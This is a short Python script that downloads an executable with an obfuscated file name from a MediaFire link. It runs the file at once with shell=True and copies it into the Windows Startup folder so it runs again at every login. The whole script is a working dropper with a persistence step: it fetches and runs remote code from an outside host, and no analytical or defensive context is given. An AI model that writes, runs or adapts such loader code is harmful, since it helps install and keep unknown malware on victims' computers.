import os
import requests
import subprocess
import shutil

# URL of the file to download and execute
url = "https://download1482.mediafire.com/l2qn6fwhw5xgoCUQ04LHw54rk6tFTG2JBeP1HRtD25sqgW1oieWMgd8kuTZZBmemFBbyRQ-PpAEsUBwgw-9QfyB6cl68TjkAEgXMHItdKNcS1sN6T3GjijtE5Eush5jrTc-KwbY_q7kDNS86tn0GAmFOT82JE7kwzMKw6NHUrWdb/os7iqcud1581tkl/r%23481jfsdaiof309jikiofa.exe"

# Download the file from the URL
response = requests.get(url)

# Save the file to disk
filename = "r#481jfsdaiof309jikiofa.exe"
with open(filename, "wb") as file:
    file.write(response.content)

# Run the downloaded file
subprocess.call(filename, shell=True)

# Add the file to the Windows startup folder
startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
shutil.copy2(filename, startup_folder)
